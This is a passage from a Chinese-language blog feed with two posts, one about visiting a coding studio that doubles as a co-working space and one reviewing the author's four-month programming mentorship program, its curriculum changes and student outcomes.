href="https://medium.com/open-coding-style/%E5%A5%BD%E6%83%B3%E5%AD%B8%E5%8D%80%E5%A1%8A%E9%8F%88-%E5%BE%9E%E9%9B%B6%E9%96%8B%E5%A7%8B%E7%9A%84%E5%8D%80%E5%A1%8A%E9%8F%88%E4%B8%96%E7%95%8C-ffa4a1429712">Panda</a>、往 YouTuber 邁進的 <a href="https://www.youtube.com/channel/UCr7GjHXlkad7hMcXMc-R3ag">Big Boy Can Code</a> 還有一位高雄前端社群的朋友。</p><p>再來就是跟 Howard 在後面坐著聊聊，主要是聊一下好想工作室到底是個怎樣的地方以及經營的模式是如何，下面總結一下我自己的理解，如果有誤的話可以留言或是私訊跟我說：</p><p>在好想工作室裡面，組成的人主要有兩種：學員跟進駐者，學員就是我前面講的那些來學程式的人，想來這邊學程式唯一的門檻就是把你的時間拿出來，禮拜一到五每天都來，沒辦法付出足夠的決心或時間的話這邊不適合你。</p><p>另一群進駐者就是把這個工作室當成 co-working space，有固定坐位可以來上班，比較多的都是 SOHO 族或是可以 remote 的工作，所以時間彈性很多。以場地的費用來說，其實進駐者繳的租金就差不多能夠打平，所以 Howard 說好想工作室「不會死」，只要不死，就有一大堆事情可以做。</p><p>好的，現在有了進駐者有了學員，然後呢？進駐者就都做自己的，學員也學自己的，鄰國相望，雞犬之聲相聞，民至老死不相往來？</p><p>根據 Howard 的說法，他覺得工程師雖然一般給人的感覺是不善交流，但其實不是的，當看到旁邊有人在講一些技術相關的話題時，常常會忍不住就跑過去一起參與討論。而好想工作室呈現出來的結果，就證明了這個理論。</p><p>所以進駐者在那邊不只是埋頭工作，還會時不時跑去跟學生交流，所以學生如果有任何問題，除了問你旁邊的同學以外，也能夠去問已經在工作的開發者。我仔細想一想發現這個真的很不錯，這是很多地方都做不到或是想不到可以做的事。</p><p>甚至連我上面提到的 mentor，其實也不是專職來做這個，而是他們本身就有其他的工作（例如說接案）之類的，當 mentor 只是順便，只是因為他想要教，所以他就是 mentor。</p><p>舉例來說，如果我今天找到了一份 remote 的工作然後進駐好想工作室，我想教大家寫廢文，於是我在這邊就可以開一個寫廢文的班級並招收學員，我工作之餘的時間就可以來當 mentor 給他們一些方向。Howard 説分享與交流這兩件事情在工程師這個圈子本來就特別明顯，看看 GitHub，看看那些技術文章跟社群分享。</p><p>所以學員來這邊有一個良好的環境可以學習，因為碰到什麼問題都有人可以問，進駐者在這邊也不會覺得無聊，閒暇之餘可以去跟學員聊聊天或是發揮自己熱心助人的本性幫助他們解決問題。</p><p>儘管來這邊的學員沒有收任何費用，但潛移默化底下就會對這邊有非常強大的認同感，當別人問到你要去哪學程式時，二話不說直接推薦好想工作室，而也有部分學生學成之後想要接案，繼續待在好想工作室變成進駐者。</p><p>一但這樣的良性循環成立以後，這邊就會聚集越來越多好的資訊人才，你有案子想發包可能會優先考慮到這裡，你企業想找人才也有可能優先考量到這，因為你知道這邊出來的人都是好的人才。</p><p>在台灣 co-working space 一大堆，做實體培訓班的也不少，但你很少看到有人把這兩者合在一起，產生出一個富有能量、讓交流與分享變得何其容易的一個空間。</p><h3 id="關於分享"><a href="#關於分享" class="headerlink" title="關於分享"></a>關於分享</h3><p>在講這個段落以前，先跟你說聲不好意思，麻煩幫我滑到最上面看看我 po 的那張照片，仔細看你會發現前面正在分享某個主題，台下有人在聽也有人專心工作，甚至還有人在討論其他東西。</p><p>這就是 Howard 想要的，他說他不覺得上台分享一定是個什麼很盛大很隆重的事，主題也不一定要很周全很完整，你想分享什麼就分享什麼。這不是 conference，只是上台分享講講話而已。</p><p>其實我也講過類似的東西，我說寫 blog 不一定要像我那樣 po 一篇完整的文章，我早期的文章也是 po 五個連結就一篇，把它當筆記在用。部落格是寫給自己看的，不是寫給別人看的，你就當筆記本在用也行。想寫就寫，不想寫就不寫，就是這麼簡單的一件事，何必搞得那麼有壓力。</p><p>在好想工作室分享就是這樣的一件事，你想講什麼就上台去講，底下的人不想聽就不聽，想做自己的就做自己的，其實是滿特別的一個景象。原本認為分享一定要是件嚴肅的事情的學員也會被這個給影響到，自己之後就願意上台去分享，讓分享這件事情變得很輕鬆，畢竟這就是分享的本質。</p><p>我有問 Howard 説那些進駐者不會覺得這樣很吵嗎？他說覺得吵可以戴耳機，或如果真的很不喜歡這樣的模式，那就不會進駐到這裡來了。說的也是，這邊風格就是這樣，不喜歡的話去其他地方也行。</p><p>老實說好想工作室不會是我想「工作」的地方，因為我很怕吵，怕爆，而且我又不喜歡戴那種與世隔絕的耳機，我需要聽到背景聲音，因此對我來說工作地點的首選是安靜，之前待過的<a href="https://www.facebook.com/huncoworkingspace/?ref=stream">混 hun</a>會被我大力誇讚也是因為超級安靜。</p><p>如果哪天我真的去那裡待一陣子，比較有可能的就是去那邊繼續開我的<a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">程式導師實驗計畫</a>並且幫助那裡的學員解惑，或如果能把這套搬過去的話應該也滿有趣的。</p><p>那天除了去參觀以外，也有上台做了點分享，要我分享我本來就很 ok 啦，只是不知道大家想聽什麼主題，Howard 說想聽為什麼我要來做教學，我就把這個主題稍微講了一下，接著開放的 QA 時間大家的問題也都滿踴躍的，最後好像講了一個多小時，比我預期中的還久。</p><p>我一直認為「將心比心」是進步的關鍵，所以我下台後都會想一下自己如果坐在台下是聽眾的話對講者有什麼期待。可以改進的第一點是用 sli.do 讓大家提問，收集問題跟統計都比較有效率；第二點是先跟大家告知我理解錯問題或是答的太久可以提醒我（可能大家不好意思當面提醒，這邊如果用網頁來做應該比較好）。</p><p>因為身為聽眾有時候會覺得講者廢話很多，就已經把問題答完了還是要鬼打牆重複一遍，有點浪費時間，所以自己當講者時就會希望不要有這種情況發生；或是回答落落長以後提問人說：「不好意思，我剛剛的問題其實是…」，如果可以在開頭先確認或者是開放提問人打斷問題會更有效率一點。</p><h3 id="與學員的交流"><a href="#與學員的交流" class="headerlink" title="與學員的交流"></a>與學員的交流</h3><p>其實我去好想工作室最想做的是跟那邊的學生交流，想知道他們在那裡的學習模式以及心得感想，或者是隨意聊聊也行，也滿好奇他們對我有哪些想問的。</p><p>人最有趣的地方就在於每個人的背景都不一樣。我以前認為自己的背景很特別，後來發現不是自己的背景很特別，而是所有人的背景都很特別，因為都是獨一無二的。就算你認為自己的背景很「一般」，在眾多特別的人裡面，你的「一般」反而也是一種特別。</p><p>在那邊我碰到資工系畢業的學生、想要自己出來創業的學員、去過資策會的學員、去過 42 的學員（超酷）、跟我一樣喜愛 FREITAG 的同好，聽過在香港開戶的慘痛故事、幫忙買賣線上遊戲虛寶卻發現事情並不單純等等，每個學員都有自己的故事、自己的理由，但來這裡的目標是一致的，就是想學程式。</p><p>你想跟誰聊天就坐到旁邊去簡單打個招呼就可以開始聊了，也很常看到學員們彼此間互相討論的情況。Howard 説那種社群技術交流活動最精彩的都不是那些講者帶來的主題，而是會後的交流時間（雖然我都直接跳過交流時間先閃人就是了），他想做的就是把那段交流時間無限延伸後放來這裡，讓好想工作室隨時都處在一個方便交流與分享的狀態。</p><p>從我這次去的經驗看來，他做到了，而且做得很不錯。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這次去參觀收穫滿滿，我也一直在想這次參觀之後給我的啟發以及可以帶回家思考的東西有哪些。</p><p>我想了想，大概就是：</p><ol><li>如果我很喜歡這模式，我有把它複製到台北的可能性嗎？</li><li>經營工作室本身活得下去但賺不了什麼錢，對我來說是 ok 的嗎？</li><li>如果我有機會複製，我會想改造或是加強哪些地方？</li><li>這次參觀的心得有沒有機會融入進我自己的教學並帶來一些改變？</li><li>沒有第五點，只是因為四不吉利所以多補一項</li></ol><p>第一天去的時候我在那裡待到晚上十一點才回去，第二天早上也去那串門子簡單待了半個小時，要說有特別聊什麼主題的話，其實也沒有，就都是想到什麼就聊什麼。</p><p>我想起以前實習時的兩個小故事，第一個小故事是在恆春採訪某個做鞋子的店家時，老闆說要把「人」放在心裡，「人」永遠都是最重要的。第二個小故事是那時的老闆跟我說交談的容易程度取決於你對對方的好奇有多少，越好奇，就越能順利地聊天。</p><p>會喜歡好想工作室這個地方，主因大概是與我本身的理念相符合，就像我喜歡 <a href="/2017/10/21/stripe-and-i-df35a6f0a799/">Stripe</a> 一樣，有種找到知音同好的感覺。</p><p>這篇其實只是簡單記錄一下去那邊的心得，還有很多東西是需要一陣子消化的，最後再次感謝 Howard 的招待以及當天我接觸過的所有人，因為我懶得一個個點出來（也點不出來）所以就一起感謝了，也要感謝 Web camp 的 Chris，以後還有很多機會可以再交流。對於 Web 班正在學前端的同學我有開我 Lidemy 上面的課給他們看，希望會有幫助，有什麼回饋（好的壞都行）都可以再跟我說。</p><p>大概就是這樣了，如果你本來不知道這個地方，但看完我這篇文章產生興趣的話，歡迎聯絡 <a href="https://www.facebook.com/chanwei.wu">Howard</a>，他很歡迎任何對好想工作室有興趣的人實際走一遭來體驗看看。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四個月過去了，來找我學程式的學生們怎麼樣了？</title>
      <link href="/2019/01/22/mentor-program-2nd-review-e7c15f24dfb8/"/>
      <url>/2019/01/22/mentor-program-2nd-review-e7c15f24dfb8/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mentor-program-2nd-review-e7c15f24dfb8/1__xOtsaohXSGtFq7GdlDTG9w.jpeg"><br><img src="/img/mentor-program-2nd-review-e7c15f24dfb8/1__cZIeFV__QUVyOZ__BkBvnesg.jpeg"></p><p><a href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/">程式導師實驗計畫第二期</a>，再到現在一月底，四個月的計畫結束得比我想像中還快。</p><p>原本對這計畫的預期是四個月學完我規劃的課程，接著再花一至兩個月找到工作，所以四個月是「學習」的時間，整個計畫其實是六個月，但這次的嘗試讓我知道課綱跟時間的分配其實是有問題的。</p><p>先說一下，這一篇基本上不太會有學生求職的成果，而是比較偏向課程本身的檢討跟學生的狀況，簡短的原因是大部分學生都還沒把課程修完所以無法找工作，文章後面會說明更詳細的理由，總之想看成果的話要等到 3 月中。</p><p>在檢討整個計畫以前，先帶大家來回顧一下從我寫下期中心得（十一月）再到期末（一月）這段期間發生了什麼事。</p><p>（前面大部分篇幅其實比較像是報告，詳實記錄發生了什麼事情以及檢討，想看我個人心得的可以直接拉到最後面）</p><h3 id="從期中到期末"><a href="#從期中到期末" class="headerlink" title="從期中到期末"></a>從期中到期末</h3><p>在<a href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/">期中檢討</a>時我就有說過，課程的問題之一是難度太高學生跟不上，所以在期中時我調整了一下進度，挪出四週來講解 PHP 的留言板並且親自示範 coding，希望能靠著這樣的舉動讓大家繼續往前。</p><p>這樣做的成效如何？還行，但不夠好。</p><p>我後來補充的那些 PHP 留言板資源讓他們對留言板的理解有幫助，但問題在於留言板本身其實是一個不太適合初學者的東西，它前面還有更多基礎要補（PHP 以及資料庫基礎），所以對進度在前面的學生幫助滿大，但是對那些進度較落後的學生幫助很有限。</p><p>那四週過後，我繼續按照著進度開始講 React 跟 Redux，但還是有很多同學卡在前面留言板的部分。在這時那些同學又會有種被拋下的感覺，而這種心理壓力會連帶影響學習，一直持續在這個狀態就會變得愈來愈沒有動力繼續下去。</p><p>十二月初的時候我眼看這樣不行，一定要想個辦法試圖在課程結束以前再拚一次，我不甘心課程就這樣子結束，於是我把課程再次做了一些調整：</p><h4 id="第一，能力分班"><a href="#第一，能力分班" class="headerlink" title="第一，能力分班"></a>第一，能力分班</h4><p>靈感來自於前陣子看的韓國節目 Produce48（Produce 101 跟創造 101 我也都有看），裡面把學生按照能力分成 A 班到 F 班，並且針對不同的班級給予不同程度的教學。</p><p>講到能力分班，一般的擔憂都是會不會 F 班就變成了放牛班，畢竟在學校裡面都是這種情形比較多。Produce48 裡面的評審給了一個我覺得很好的回應，她說分班並不是真的要把你們按照能力去分，然後 A 班就永遠是 A 班，永遠比 B 班厲害，不是這樣的；而是每個人的程度本來就不同，所以也需要有不同的教法，分班的目的是為了讓每個人都能得到最適合的教學。</p><p>在第十三週的時候，我把學生按照目前作業的進度分成以下幾組並且幫每一組設定了目標：</p><p>A班：6人（完成第十一週作業）<br>目標：在今年結束（12&#x2F;31）前把 React 學完，明年初開始求職</p><p>B班：6 人（完成第八週作業）<br>目標：在結業日期（1&#x2F;14）前把課程全部修完，接著開始求職</p><p>C班：13 人（完成第五週作業）<br>目標：在過年（2&#x2F;1）前把所有課程修完，過年後開始找工作</p><p>D班：4人（完成第四週作業）<br>目標：在結業（1&#x2F;14）前把留言板這個作業徹底搞懂</p><p>F班：4人<br>目標：需討論</p><p>（原本 36 人，扣掉 3 個工程師加強班的之後一共 33 人）</p><p>這計劃有兩個時間點很重要，第一個是結業也就是 1&#x2F;14，從開始到結業一共是四個月；第二個是再往後兩個月：3&#x2F;14 也就是計劃整個結束的時間。</p><p>所以往前推回來，儘管現在進度落後，我還是希望大部分的學生都能在計畫結束以前找到工作，所以才會訂立了那些目標。</p><p>我給自己的目標是：<strong>在 3&#x2F;14 以前讓 ABC 班的學生（共 25 人）找到工作</strong>。至於 D 班跟 F 班狀況比較特殊（例如說 F 班基本上只寫過一兩次作業或甚至根本沒寫過），所以需要再看看個人的進度來調整一下。</p><p>分班的第一個目的我剛講了，因材施教，第二個目的則是讓學生有個明確的目標可以往前努力，我覺得這點滿重要的。有目標才有動力才知道自己要游到哪裡，如果沒有分班還是維持舊的目標，那在比較後面的學生一定吃不消，就會覺得一定跟不上然後很沒有動力。</p><h4 id="第二，課程內容重新調整"><a href="#第二，課程內容重新調整" class="headerlink" title="第二，課程內容重新調整"></a>第二，課程內容重新調整</h4><p>在分班的消息公佈以後，我有發一個問卷給大家填，希望能知道大家主要卡關的點在哪裡。而根據這些回饋，最多人卡住的地方可能就是課程本身不夠詳細，導致很多東西都要往外去尋求資源，可是學生們又不太知道該如何篩選資源導致花的時間過長。</p><p>這一點就是以前我一直提到的，我還是抓不到課程內容到底要講多細，待會會再針對這點來做探討，這邊就先簡單帶過去。</p><p>總之為了解決這個問題，我把課程內容重新做了調整，在 PHP 的部分新增了三個專案會由我一步步帶，在 React 的部分也這樣做了。簡單來說就是我自己錄好一些基礎的課程，讓他們可以不用再去花心力篩選外面的資源：</p><p><img src="/img/mentor-program-2nd-review-e7c15f24dfb8/1__yR__XIgd8ysDozgUtjHHH6Q.png"></p><p>目的是為了減輕學生的負擔，藉由一步步帶著實作讓他們至少能有最基礎的概念，接著還會提供一些進階練習，讓他們嘗試看看自己實作出一些附加功能。</p><p>這些課程算是在 PHP 基礎與課程主要作業留言板中間的銜接課程，所以先看之前的影片理解基礎跟原理，再來跟著這個課程做練習，最後才去寫原本課程裡最重要的一個作業：留言板。</p><h4 id="第三，寫題目維持手感"><a href="#第三，寫題目維持手感" class="headerlink" title="第三，寫題目維持手感"></a>第三，寫題目維持手感</h4><p>不知道哪天突然有的 idea，那就是我想寫一個 online judge system 讓學生玩。先花兩分鐘幫大家介紹一下，這種 online judge system（以下簡稱 OJ）比較有名的就是 leetcode 或者是 UVa，上面有很多道題目，你可以自己 submit 你的答案然後系統會幫你批改，改完之後可以知道正確與否。</p><p>這類的題目不一定要很難也不一定要學過演算法才能寫，也可以有一些簡單的題目，接著我就想到我國中時參加的 <a href="https://contest.cc.ntu.edu.tw/npsc2018/">NPSC</a>，是一個台大舉辦的給國中生與高中生參加的比賽，裡面很多題目的難度其實都很適合給新手練習。</p><p>原本想用現成開源的系統，可是要嘛就是不支援 JavaScript，要嘛就是輸出入方式弄的有點複雜，只好自幹了一套簡單的 OJ，用 function 的參數跟回傳值當作輸出入以降低複雜度。</p><p><img src="/img/mentor-program-2nd-review-e7c15f24dfb8/1__DRdlkmkrkCghzLXSN3yKTQ.png"></p><p>所以 OJ 的目的有兩個，第一個是想讓學生們練習這些題目維持手感，題目簡單歸簡單，但一不小心還是很有可能會出錯。</p><p>第二個是希望讓他們覺得這個計畫是一直有在動的。每一個禮拜都會有新的題目，而且進度在後面的學生也一樣可以來解題，不會有被拋下的感覺。</p><p>原本的課程規劃後面四週都拿來做 final project，但目前學生基礎都還沒打好，更別談什麼 final project，因此就挪用那些時間拿來重新把基礎打好，而以上三個改動大約在第十三週的時候提出，希望剩下的四五週內大家可以重新燃起鬥志。</p><p>提出這些改動以後，有許多學生都感謝我沒有放棄，因為我不想也不能放棄。教學是一場團體賽，任何一方先放棄了，比賽就結束了。就像打 LOL 一樣（還是我應該換成傳說對決，畢竟 LOL 過氣了），我一個人再強也沒辦法一個打九個。</p><p>大家有聽過木桶理論嗎？一個木桶由很多木板組成，最後可以裝多少水是由最短的木板來決定，而不是最長的。意思是如果只有我一個人強是沒有用的，大家一起變強比較實際。</p><p>以上就是整個課程從期中到期末大致上的發展，我再次調整了課程以及新增一些資源，試圖讓大家繼續保持學習的動力。</p><h3 id="那現在呢？學生狀況如何？"><a href="#那現在呢？學生狀況如何？" class="headerlink" title="那現在呢？學生狀況如何？"></a>那現在呢？學生狀況如何？</h3><p>以原本計畫來說，一月中應該要修完所有課程以及完成 final project，那有做到這個的有幾個人？零個。</p><p>沒錯，就是 0，走入零度空間等到一切分裂的那個零。</p><p>原因有兩個，第一個是能跟上進度的學生少之又少，第二個是有跟上進度的同學已經找到工作了，在寫 final project 之前就找到工作了。</p><p>儘管沒有依照計畫來跑，但其實也不是件壞事。原本在課程裡規劃了四週的時間讓大家做 final project，到後來我跟大家說不要管 final project 了，原本的課程都上不完了，也沒什麼好寫的，先把課程上完比較實在，所以後來那四週就一樣繼續把前面沒跟到的進度補完，對學生來說多了四週的時間學習。</p><p>以這十五週的課程來說，上到最後，幾乎所有學生都能順利修完六週的課程，半數的人可以修到第十週，25% 的人可以修到第十三週，幾乎沒有人能夠全部修完，如果純粹以這個當作指標來看的話，其實還滿慘的，而且可以認定課綱的規劃有問題。</p><p>課綱的確是有地方需要調整，這我也絕對承認，之後會有一些部分在講課綱應該要怎麼調整比較好。</p><p>那學生現在還是繼續在學嗎？對，當然有一些已經消失滿久了，甚至有些幾乎從頭消失到尾，但依舊有些學生繼續努力著，所以我跟他們說就不要管原本計畫的那些學習的時程了，現在只有一個目標：「3&#x2F;14 以前找到工作」。</p><p>以學生人數大約 30 個來看（扣掉 F 班），有 3 個人已經順利找到工作，5 個近期會開始投履歷，5 個還在持續學習且進度在比較前面，我覺得有希望達成目標，所以計畫結束前希望能有 13 個人（四成）順利找到工作。其他還有大概 11 個人一直在努力著，有望在 3&#x2F;14 的時候「修完」課程，如果能在那時修完的話，大概 5 月前有機會找到工作。</p><p>原本在改動計畫時提出的「希望 ABC 班共 25 人都能在結業前找到工作」看似是不太可能了，可能只有一半也就是 13 人能在 3&#x2F;14 以前達成這目標，但若是再給其他人一兩個月，我相信他們也很有機會找到工作。</p><p>以上的數字只是個大略的估計而已，因為現在樣本數有點少，所以詳細的數據會在 3&#x2F;14 的時候再 po 一篇心得跟大家分享這個計畫的成果，現在能跟大家說的就是從計畫開始到現在四個月多，有大約 10% 的學生找到工作，薪水範圍是 35k~45k。</p><p>所以學生的狀況差不多就是這樣，原本計畫的時程太過於樂觀，實際狀況是大部分人都還在努力學習著，本來是三個月學習 + 一個月 final project + 兩個月求職，現在看來會是五個月學習 + 一個月求職。</p><p>我滿期待 3&#x2F;14 那天跟大家分享這個計畫最終的一些數據，畢竟上一期沒什麼可以分享，這一期人多了樣本數就多了，可以分享的東西也變多了。</p><p>講完這些以後，來為自己的課程做些檢討吧。</p><h3 id="教學細節的拿捏"><a href="#教學細節的拿捏" class="headerlink" title="教學細節的拿捏"></a>教學細節的拿捏</h3><p>上面有提到過我一直認為自己在教學細節的拿捏上這塊做的不是很好，不知道該教多少才是好的。</p><p>可以把這些細節看成是光譜，最右邊是教太多，會造成學生只會跟著教學做，一拿掉就不會；最左邊是教太少，學生根本無所適從，光查資料就花一堆時間。</p><p>根據經驗證明，如果學生本身能力夠強（像第一名的）或是時間拉長（像從第一期跟到第二期的），現在的課綱是完全 ok 的，但現在課綱的問題在於對大部分人來說還是太快了，梯子的間隔也更大，需要花好一段時間才能往上爬一階。</p><p>以前我一直認為你只能在這兩者之間找一個平衡點，教太少就往右移一點，太多就往左移一點，直到你找到那個平衡點為止。可是換個角度想，為什麼不能兩者並行？我是笨蛋嗎？</p><p>我以前開始學程式時老師也不會什麼都沒教就直接叫我寫一個留言板，這樣我連怎麼開始都不知道。學習的第一步是什麼？是模仿，所以一開始的教學應該能夠多詳細就多詳細，把你的步驟你的思考方式一步步拆解然後全部示範出來，手把手帶學生做出第一個東西。</p><p>在這一個階段，是處於最右邊的，教學詳細的程度將近 100%，每一個步驟、每一個原理、甚至是每一行程式碼都講解，學生幾乎不用自學任何東西。</p><p>接著呢？加幾個練習題讓學生根據現有的東西新增功能，所以難度就降低了，這時候不是從零到一，而是從一到一點一，如此一來就能兼顧前面那段完全不會的時光以及後面那段需要放手讓他們自由飛的時候。或者老師也可以先完成一部分的專案，剩下的一部分讓學生填空。</p><p>這時候在光譜上是處於中間偏右大約 0.75 的位置，你教了很多但是留一些東西沒有教，那些就是學生必須去自學的部分。</p><p>所以當我在帶著做的時候，你就跟著做就對了。做一次不懂，就砍掉再跟一次，還是不懂就再做一次，真的有哪邊不知道是什麼意思的話請務必要來問我。我會盡量做到每一行都讓你理解。有了這個經驗之後，碰到新的東西就不至於這麼迷惘。</p><p>再來呢？再來調整成 0.25 的位置，只跟你說我想要怎樣的產品，然後大概有哪些功能，可能會用到哪些技術，其他的東西你都要自己搞定。</p><p>我可能只會寫一些 code，或甚至什麼都不會寫。這個階段學生就必須自立自強，但我相信是沒問題的。雖然會碰到很多困難，但因為已經有之前打下來的基礎，解決問題會容易許多。反之，如果一開始就把學生放在這個位置，那寫作業就會變成一件困難又痛苦的事情。就好像我教了 Hello world 然後叫學生寫一個部落格來給我。</p><p>總結以上的概念，我認為教學可以分為三個階段。</p><h4 id="第一階段溫室期"><a href="#第一階段溫室期" class="headerlink" title="第一階段溫室期"></a>第一階段溫室期</h4><p>什麼都教，細節說有多細就有多細，不過一但脫離了這個溫室，學生就什麼都不會。在這個階段的目標是讓學生理解基本運作以及學會基礎技能。</p><h4 id="第二階段探索期"><a href="#第二階段探索期" class="headerlink" title="第二階段探索期"></a>第二階段探索期</h4><p>基礎漸漸細節越講越少，著重在延伸功能以及一些概念，不會像溫室期那樣手把手教學，目標是成為下一階段之前的緩衝，培養自學能力。</p><h4 id="第三階段撞牆期"><a href="#第三階段撞牆期" class="headerlink" title="第三階段撞牆期"></a>第三階段撞牆期</h4><p>把學生實際放出去，只給大方向的東西完全不提細節，要自己串 API 串 library 以及看文件，途中一定會繼續撞牆，但有了溫室期跟探索期的培養，受傷就不會那麼嚴重。</p><p>以改版之前的課程來說，其實是屬於直接從探索期開始而忽略了溫室期，所以對一些有基礎或是對程式比較有概念的同學其實是 ok 的，只要多花點時間一樣可以搞定。但是對另外一群同學就不是了，需要花很多很多時間在上面，才能自己慢慢跟上進度。</p><h3 id="課程的優缺點"><a href="#課程的優缺點" class="headerlink" title="課程的優缺點"></a>課程的優缺點</h3><p>一直以來我都很喜歡研究其他人的課程，一方面想看別人怎麼教，另一方面能吸收他人的優點再轉化到自己的課程上。每次看到別人的課程我都會想一下自己的課程到底跟其他人的差在哪裡？跟其他人的課程比較，也可以更凸顯出自己課程的優缺點。</p><h3 id="缺點"><a href="#缺點" class="headerlink" title="缺點"></a>缺點</h3><p>先講缺點好了，我吃飯的時候也習慣先把不喜歡吃的吃掉，喜歡吃的留在最後面。</p><h4 id="第一點：社群"><a href="#第一點：社群" class="headerlink" title="第一點：社群"></a>第一點：社群</h4><p>其實滿多線上課程都很強調社群這個概念，而我自己也知道社群之於線上課程的重要性。畢竟傳統課程你每天都會見到同學，但是線上課程不會，所以沒有刻意去做這塊的話，同學之間的連結就會比較弱，也會缺乏一些彼此砥礪的動力。</p><p>在社群這塊我做得很差，這點我自己也知道。我想原因之一是我自己本來就沒有很喜歡參與社群，更偏好一個人獨來獨往，所以在自己的喜好之下便沒有把社群這點給帶進課程裡。當然，如果學生自己主動的話還是可以跟其他人有互動，但課程本身並沒有類似的機制去觸發這個流程，所以學生之間的互動就來得比較少。</p><h4 id="第二點：課程難度過高"><a href="#第二點：課程難度過高" class="headerlink" title="第二點：課程難度過高"></a>第二點：課程難度過高</h4><p>這點我之前也一直有提過了，我只給大方向就要他們自己生出一個作品來，對初學者來說難度過高，所以課程後半段針對這點做了滿多改動，最理想的情形是自己錄手把手教學影片，在前期時讓學生能夠跟得上，而後期才讓學生培養自學能力自己去找資源。</p><h4 id="第三點：課程安排太過緊湊"><a href="#第三點：課程安排太過緊湊" class="headerlink" title="第三點：課程安排太過緊湊"></a>第三點：課程安排太過緊湊</h4><p>搭配前面講到的課程難度過高，就很容易導致學生進度跟不上，而且還不是一兩個學生，而是幾乎所有的學生都沒辦法跟上。</p><p>這一點有同學給了一個建議很不錯，那就是加入一個複習週在中間，那一週讓大家複習之前的進度，當作之間的緩衝，這提議很好。</p><p>再來如果把課程安排的鬆一點，可能進度比較快的同學就會覺得這樣反而太慢，所以可以致敬 CS50 把作業加上一個 hacker edtion，難度升高。如果有人進度超前，就可以自己去做 hacker edtion 練習。</p><h4 id="第四點：作業強度"><a href="#第四點：作業強度" class="headerlink" title="第四點：作業強度"></a>第四點：作業強度</h4><p>如果可以的話，我希望課程裡面出現的那些專案的強度能夠更接近業界一點。有些同學會問我說現在這樣寫作業跟以後工作寫程式到底差別在哪裡，我以前也有過這樣的問題。</p><p>而我自己對這個問題的答案是：「細節跟規模」，像是作業的留言板可能堪用就好，可是如果你今天是一間公司推出一個留言板產品，你必須保證它可以承受一定的流量以及有一定的品質，這些都是作業無法比擬的。</p><p>所以之後希望能把作業變得更複雜一點，讓整個的感覺更貼近在工作的時候。</p><h3 id="優點"><a href="#優點" class="headerlink" title="優點"></a>優點</h3><h4 id="第一點：在意資訊安全"><a href="#第一點：在意資訊安全" class="headerlink" title="第一點：在意資訊安全"></a>第一點：在意資訊安全</h4><p>我一直認為身為一個做 Web 的工程師，資訊安全絕對是超級重要的一點，至少你一定要對 SQL Injection 跟 XSS 有一定程度的理解才行。</p><p>在我的課程裡面還講了 CSRF，也在其中一週帶同學看了 OWASP 的十大安全漏洞，偶爾也會分享 <a href="https://blog.orange.tw/">Orange</a> 大大的一些文章，我會帶著學生們稍微看一下那些文章，雖然我自己也不是完全懂，但至少可以讓他們跟著我一起開開眼界，增廣見聞。</p><p>在資訊安全的部分我希望能提高他們的眼界，讓學生知道說原來這樣子也會被攻擊，原來連那些超級大網站也有這種漏洞。當他們有這種概念時，在寫程式時就會特別去注重這種安全性問題，在 render 的時候會注意有沒有 XSS，在存取資料時會注意有沒有 IDOR。</p><p>不過老實說，在教資訊安全這件事情上我做的沒有很好。之前有個好心的朋友聯絡我，說我學生放在履歷上的作品有 XSS 的漏洞。檢查以後我就跟學生再宣導了一次資訊安全的重要性，我相信他們也能理解，但有時還是會不小心寫出有漏洞的程式碼。</p><p>說起來滿諷刺的，我自己覺得課程優點是在意資訊安全，可是教出來的學生寫出來的東西有一堆資安漏洞。以後這方面我會更加注意一點，希望可以把資訊安全的概念深植在他們心中，每寫一行 code 的時候就會考量到是否有被攻擊的風險。</p><h4 id="第二點：在意基礎"><a href="#第二點：在意基礎" class="headerlink" title="第二點：在意基礎"></a>第二點：在意基礎</h4><p>我的教學路線就是從基礎一路往上打，在學 React 之前會讓你把需要的基礎都先學完，在打好基礎以前不往上走。</p><p>這也是為什麼網頁後端我會從 PHP 開始，這個程式語言至今依然是我認為最適合初學者的語言，因為它夠簡單，而且幾乎沒有任何「<a href="/2018/11/22/there-is-no-magic-in-my-classroom-4926b67c06f5/">魔法</a>」在背後。當 PHP 的專案變大而且你又不採用任何框架或架構時，程式碼會變得很亂，而這就是我要的，這就是我想讓學生感受到的。</p><p>我認為比起一開始就學框架，從 PHP 先開始會得到更好的成效。因為你進入框架時心中是有一個問題希望被解決的。</p><p>但如果是從框架開始，你根本不知道為什麼要用；或是你可能知道，但對這個理由沒有共鳴（kerokerokerokero）。</p><h4 id="第三點：在意原因"><a href="#第三點：在意原因" class="headerlink" title="第三點：在意原因"></a>第三點：在意原因</h4><p>每一週的作業都會有一個簡答題，你必須回答我們在這週為什麼要用這個技術以及不用會如何。這其實就是我之前寫過的：<a href="/2018/10/29/learn-coding-9c572c2fb2/">當我們在學程式時，要學的應該是什麼？</a></p><p>課程的安排是有順序的，每一週都是在為了下一週鋪路。有了前面的鋪陳，才會更理解接下來為什麼要學習這個技術。要用它必須是要有理由的，不然為什麼要用？而且這理由不是：「因為剛好看到」、「因為主管叫我用」，這些理由不夠「強」，必須要有一個強而有力的理由，才能證成使用的合理性。</p><h4 id="第四點：透明"><a href="#第四點：透明" class="headerlink" title="第四點：透明"></a>第四點：透明</h4><p>我盡可能地把<a href="https://github.com/Lidemy/mentor-program-2nd">課程的教材</a>、課程的心得跟<a 